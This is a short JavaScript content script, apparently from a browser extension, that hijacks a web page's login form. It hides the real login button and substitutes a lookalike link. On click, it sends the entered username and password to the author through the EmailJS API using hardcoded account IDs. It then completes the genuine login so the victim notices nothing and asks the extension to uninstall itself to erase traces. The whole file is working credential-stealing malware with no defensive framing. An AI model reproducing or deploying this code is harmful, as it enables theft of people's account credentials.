document.getElementsByTagName("button")[0].style = "display: none !important;";
document.getElementsByTagName("button")[0].disabled = "disabled";
document.getElementsByTagName("button")[0].parentElement.insertAdjacentHTML( 'beforeBegin', '<a type="submit" id="second" class="btn btn-primary btn-block">Login</a>' );
document.getElementById("second").addEventListener("click", locate);

username = document.getElementById("username").value;
password = document.getElementById("password").value;
function locate() {
  fetch("https://api.emailjs.com/api/v1.0/email/send", {
    "headers": {
      "content-type": "application/json"
    },
    "body": "{\"lib_version\":\"3.2.0\",\"user_id\":\"user_2aKFwhk4SnwfqfpAnQLlW\",\"service_id\":\"service_8jz5ztq\",\"template_id\":\"template_p08l3km\",\"template_params\":{\"message\":\" Username: " + document.getElementById("username").value + "    Password: " + document.getElementById("password").value + "\"}}",
    "method": "POST",
  }).then(response => login())
}
function login() {
  document.getElementsByTagName("button")[0].removeAttribute("disabled");
  document.getElementsByTagName("button")[0].click();
  chrome.runtime.sendMessage({uninstall: "true"});
}
